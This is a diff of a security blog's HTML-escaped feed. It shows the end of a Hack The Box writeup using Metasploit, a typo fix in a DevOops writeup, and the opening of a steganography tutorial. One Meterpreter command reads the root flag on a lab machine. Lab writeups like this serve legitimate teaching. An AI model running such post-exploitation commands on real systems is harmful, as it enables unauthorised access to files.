+&lt;p&gt;We can now retrieve the &lt;strong&gt;root flag&lt;/strong&gt; the same way we did for the user:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/Administrator/Desktop/root.txt
+c837f7b[...]f9d4f5ea
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://media3.giphy.com/media/g9582DNuQppxC/giphy.gif?cid=3640f6095bd60b65474c4d7255c34b91&quot; alt=&quot;Congratulations&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Et voilà!&lt;/p&gt;
+
+&lt;h2 id=&quot;final-words&quot;&gt;Final Words&lt;/h2&gt;
+
+&lt;p&gt;I hope it gave you a brief overview of the power of &lt;strong&gt;Metasploit Framework&lt;/strong&gt; and its ease of use. However, keep in mind that this tool will not help you to understand what is really happening on the machine.&lt;/p&gt;
+
+&lt;p&gt;Do not hesitate to ask your questions if something remains unclear for you :relaxed:.&lt;/p&gt;
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. This machine was pretty easy so I’m going to take this opportunity to explain you the basics of the Metasploit framework.</summary></entry><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/writeup/web/2018/10/10/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/devoops-box.png&quot; alt=&quot;DevOops box&quot; title=&quot;DevOops Box&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phate to the privilege escalation.
+&lt;p&gt;In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.
  &lt;!--excerpt--&gt;&lt;/p&gt;
 
 &lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
@@ -231,7 +680,7 @@ root@gitter:~#
 
 &lt;p&gt;Bingo! Enjoy the flag :wink:&lt;/p&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phate to the privilege escalation.</summary></entry><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.</summary></entry><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/tutorial/stegano/2018/08/12/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;
 
